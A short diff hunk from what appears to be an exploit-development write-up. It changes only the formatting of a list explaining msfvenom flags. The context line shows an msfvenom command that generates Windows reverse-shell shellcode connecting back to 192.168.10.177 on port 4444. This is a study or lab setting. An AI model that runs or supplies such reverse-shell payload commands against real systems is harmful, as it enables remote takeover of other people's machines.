@@ -407,11 +407,11 @@ Generation of shellcode using the below command:
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.177 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\xa0\xd0"
 ```
 
--p: payload
-EXITFUNC=thread: makes the exploit a little more stable
--f: filetype
--a: architecture
--b: bad characters
+-p: payload \
+EXITFUNC=thread: makes the exploit a little more stable \
+-f: filetype \
+-a: architecture \
+-b: bad characters \
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MQHyw9QcRYppYFKEohp%2F-MQIUCGNdU5vLgxZFo4k%2Fimage.png?alt=media&token=2ef36183-50f8-4cae-b2fd-5c87b65e441a)
 
